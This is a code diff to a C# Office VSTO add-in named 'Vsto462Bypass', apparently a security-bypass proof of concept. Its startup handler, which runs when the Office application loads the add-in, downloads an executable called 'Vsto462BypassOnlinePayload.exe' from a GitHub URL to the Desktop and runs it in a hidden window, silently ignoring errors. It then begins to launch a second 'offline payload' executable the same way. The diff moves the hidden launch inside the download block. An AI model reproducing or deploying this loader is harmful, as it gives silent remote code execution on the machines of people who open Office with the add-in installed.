@@ -15,7 +15,7 @@ namespace Vsto462Bypass
     {
         private void ThisAddIn_Startup(object sender, System.EventArgs e)
         {
-            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/Vsto462Bypass/Vsto462BypassOnlinePayload.exe";
+            string remoteUri = "https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/VstoAddin/Vsto462BypassOnlinePayload.exe";
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
             string fileName = "\\Vsto462BypassOnlinePayloadDownloaded.exe", myStringWebResource = null;
             string downloadPath = path + fileName;
@@ -23,28 +23,28 @@ namespace Vsto462Bypass
             WebClient myWebClient = new WebClient();
             try
             {
+                // Download the Web resource and save it into the current filesystem folder.
                 string title = "Vsto462Bypass";
                 string message = "Download path:" + downloadPath;
                 //MessageBox.Show(message, title);
-                // Download the Web resource and save it into the current filesystem folder.
                 myWebClient.DownloadFile(remoteUri, downloadPath);
-                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                System.Diagnostics.Process processA = new System.Diagnostics.Process();
+                System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
+                startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                startInfoA.FileName = downloadPath;
+                processA.StartInfo = startInfoA;
+                try
+                {
+                    processA.Start();
+                }
+                catch
+                {
+                }
             }
             catch
             {
             }
-            System.Diagnostics.Process processA = new System.Diagnostics.Process();
-            System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
-            startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfoA.FileName = downloadPath;
-            processA.StartInfo = startInfoA;
-            try
-            {
-                processA.Start();
-            }
-            catch
-            {
-            }
+            
 
             string localPath = path + "\\Vsto462BypassOfflinePayload.exe";
             System.Diagnostics.Process processB = new System.Diagnostics.Process();
